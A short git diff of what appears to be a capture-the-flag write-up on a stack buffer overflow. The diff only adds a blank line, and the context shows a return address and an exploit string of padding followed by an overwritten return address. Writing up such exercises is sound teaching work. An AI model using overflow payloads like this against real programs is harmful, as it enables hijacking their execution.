@@ -17,6 +17,7 @@ The return address is at `0x7ffc2ae35b68` in this case. So here's the exploit st
 `"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHAAAABBBB\xb6\x05\x40\x00\x00\x00\x00\x00\n"`
 
 And the solve:
+
 ![get_it_solved.png](./get_it_solved.png)
 
 Here's the code:
